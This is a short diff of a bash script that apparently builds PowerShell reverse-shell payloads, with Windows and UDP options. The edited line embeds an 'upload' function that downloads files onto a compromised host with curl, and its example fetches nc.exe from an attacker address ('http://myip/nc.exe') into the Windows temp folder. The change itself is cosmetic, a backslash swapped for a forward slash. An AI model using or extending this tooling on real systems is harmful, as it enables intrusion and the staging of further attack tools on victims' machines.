@@ -425,6 +425,7 @@ result=$(openssl rand -hex $(shuf -i 1-11 -n1))
 
 
 
+
 #Windows?
 if [[ $3 == "w" ]]
 then 
@@ -439,7 +440,7 @@ fi
 
 
 #Upload function. Can be commented out or changed to what ever you like
-func="function help {\$sendback2 + \"\`n\`rYou can upload files by entering: upload source-url target-folder\\filename. \`n\`rexample: upload http://myip/nc.exe /windows/temp/nc.exe\`n\`r\"};function upload {curl \$args[0] -o \$args[1] -UseBasicParsing};"
+func="function help {\$sendback2 + \"\`n\`rYou can upload files by entering: upload source-url target-folder/filename. \`n\`rexample: upload http://myip/nc.exe /windows/temp/nc.exe\`n\`r\"};function upload {curl \$args[0] -o \$args[1] -UseBasicParsing};"
 
 
 if [[ $4 == "udp" ]]
